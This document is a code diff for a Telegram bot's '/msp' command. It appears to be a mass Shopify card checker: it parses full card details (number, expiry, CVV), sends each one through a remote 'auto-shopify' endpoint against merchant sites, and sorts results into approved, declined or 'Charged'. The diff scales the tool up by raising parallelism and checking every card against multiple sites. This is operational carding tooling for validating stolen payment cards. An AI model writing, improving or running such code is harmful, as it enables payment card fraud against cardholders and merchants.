@@ -3252,9 +3252,8 @@ from db import get_user, update_user
 # Cooldown tracking
 last_msp_usage = {}
 
-# Regex for full card format (captures full CC|MM|YY|CVV)
+# Regex for full card format (captures CC|MM|YY|CVV)
 CARD_REGEX = re.compile(r"\d{13,19}\|\d{2}\|\d{2,4}\|\d{3,4}")
-
 
 # Consume credit once
 async def consume_credit(user_id: int) -> bool:
@@ -3265,39 +3264,35 @@ async def consume_credit(user_id: int) -> bool:
         return True
     return False
 
-
 # Shopify check request
 async def check_card(session: httpx.AsyncClient, base_url: str, site: str, card: str):
     try:
         url = f"{base_url}?site={site}&cc={card}"
         r = await session.get(url, timeout=20)
         data = r.json()
-        resp = data.get("Response", "Unknown")
-        status = data.get("Status", "false")
-        price = data.get("Price", "0")
-        gateway = data.get("Gateway", "N/A")
-        return resp, status, price, gateway
+        return (
+            data.get("Response", "Unknown"),
+            data.get("Status", "false"),
+            data.get("Price", "0"),
+            data.get("Gateway", "N/A"),
+        )
     except Exception as e:
         return f"Error: {e}", "false", "0", "N/A"
 
-
 # Background runner
-async def run_msp(update: Update, cards, base_url, site, msg):
+async def run_msp(update: Update, cards, base_url, sites, msg):
     approved, declined, errors = 0, 0, 0
     checked = 0
     site_price = None
     gateway_used = "Self Shopify"
     results = []
+    sem = asyncio.Semaphore(10)  # parallelism (adjust as per VPS power)
+    lock = asyncio.Lock()  # prevent race on message editing
 
-    sem = asyncio.Semaphore(2)  # parallel limit
-    lock = asyncio.Lock()       # prevent race in msg editing
-
-    # ✅ success keywords
     success_keywords = ["thank you", "approved", "charged", "success", "insufficient funds"]
 
     async with httpx.AsyncClient() as session:
-
-        async def worker(i, card):
+        async def worker(card, site):
             nonlocal approved, declined, errors, checked, site_price, gateway_used, results
 
             async with sem:
@@ -3306,9 +3301,10 @@ async def run_msp(update: Update, cards, base_url, site, msg):
 
                 resp, status, price, gateway = await check_card(session, base_url, site, card_str)
                 resp = str(resp)
+                resp_upper = resp.upper().strip()
 
-                # Set site price once
-                if i == 0 and site_price is None:
+                # Save price from first request
+                if site_price is None:
                     try:
                         site_price = float(price)
                     except:
@@ -3316,8 +3312,6 @@ async def run_msp(update: Update, cards, base_url, site, msg):
 
                 if gateway and gateway != "N/A":
                     gateway_used = gateway
-
-                resp_upper = resp.upper().strip()
 
                 # Classification
                 if "R4 TOKEN EMPTY" in resp_upper:
@@ -3338,44 +3332,48 @@ async def run_msp(update: Update, cards, base_url, site, msg):
 
                 checked += 1
 
-                # ✅ Enhance response if success
                 display_resp = escape(resp)
                 if any(word in resp_upper.lower() for word in success_keywords):
                     display_resp = f"{escape(resp)} ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
 
-                results.append(
-                    f"{status_icon} <code>{escape(card_str)}</code>\n ↳ <i>{display_resp}</i>"
+                result_line = (
+                    f"{status_icon} <code>{escape(card_str)}</code>\n"
+                    f" ↳ <i>{display_resp}</i>\n"
+                    f" 🌍 Site: {site}"
                 )
+                results.append(result_line)
 
-                # Update message safely (one at a time)
+                # Update message safely
                 async with lock:
                     summary_text = (
                         "<pre><code>"
                         f"📊 𝐌𝐚𝐬𝐬 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐂𝐡𝐞𝐜𝐤𝐞𝐫\n"
                         f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                         f"🌍 𝑻𝒐𝒕𝒂𝒍 𝑪𝒂𝐫𝐝𝐬 : {len(cards)}\n"
-                        f"✅ 𝑨𝒑𝐩𝐫𝐨𝐯𝐞𝐝    : {approved}\n"
-                        f"❌ 𝑫𝐞𝐜𝐥𝐢𝐧𝐞𝐝    : {declined}\n"
-                        f"⚠️ 𝑬𝐫𝐫𝐨𝐫       : {errors}\n"
-                        f"🔄 𝑪𝐡𝐞𝐜𝐤𝐞𝐝     : {checked} / {len(cards)}\n"
-                        f"💲 𝑺𝐢𝐭𝐞 𝑷𝐫𝐢𝐜𝐞  : ${site_price if site_price else '0.00'}\n"
-                        f"🏬 𝑮𝐚𝐭𝐞𝐰𝐚𝐲     : {gateway_used}\n"
+                        f"✅ 𝑨𝒑𝐩𝐫𝐨𝐯𝐞𝐝 : {approved}\n"
+                        f"❌ 𝑫𝐞𝐜𝐥𝐢𝐧𝐞𝐝 : {declined}\n"
+                        f"⚠️ 𝑬𝐫𝐫𝐨𝐫 : {errors}\n"
+                        f"🔄 𝑪𝐡𝐞𝐜𝐤𝐞𝐝 : {checked} / {len(cards) * len(sites)}\n"
+                        f"💲 𝑺𝐢𝐭𝐞 𝑷𝐫𝐢𝐜𝐞 : ${site_price if site_price else '0.00'}\n"
+                        f"🏬 𝑮𝐚𝐭𝐞𝐰𝐚𝐲 : {gateway_used}\n"
                         f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                         "</code></pre>\n"
                         f"#𝑨𝒖𝒕𝒐𝒔𝐡𝐨𝐩𝐢𝐟𝐲𝒄𝐡𝐞𝐜𝐤𝒔\n"
                         f"────────────────\n"
                     )
-                    final_text = summary_text + "\n".join(results)
-
+                    final_text = summary_text + "\n".join(results[-20:])  # only show last 20 to avoid flooding
                     try:
                         await msg.edit_text(final_text, parse_mode="HTML")
                     except:
                         pass
-                    await asyncio.sleep(0.2)
 
-        # Run workers in parallel
-        await asyncio.gather(*(worker(i, c) for i, c in enumerate(cards)))
+        # Launch all tasks: every card × every site
+        tasks = []
+        for card in cards:
+            for site in sites:
+                tasks.append(worker(card, site))
 
+        await asyncio.gather(*tasks)
 
 # /msp command
 async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -3404,6 +3402,7 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cards = [m.group(0) for m in CARD_REGEX.finditer(raw_input)]
     if not cards:
         return await update.message.reply_text("❌ No valid cards found.")
+
     if len(cards) > 50:
         cards = cards[:50]
 
@@ -3416,14 +3415,16 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return await update.message.reply_text("❌ You have no credits left.")
 
     base_url = user_data.get("base_url", "https://auto-shopify-6cz4.onrender.com/index.php")
-    site = user_data.get("custom_url")
-    if not site:
-        return await update.message.reply_text("❌ No custom_url set in your account.")
+    sites = user_data.get("custom_urls", [])  # ✅ now supports multiple sites
+
+    if not sites:
+        return await update.message.reply_text("❌ No sites found in your account (custom_urls empty).")
 
     msg = await update.message.reply_text("💳 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐌𝐚𝐬𝐬 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐂𝐡𝐞𝐜𝐤…")
 
-    # Run in background, don’t block bot
-    asyncio.create_task(run_msp(update, cards, base_url, site, msg))
+    # Run in background
+    asyncio.create_task(run_msp(update, cards, base_url, sites, msg))
+
 
 
 
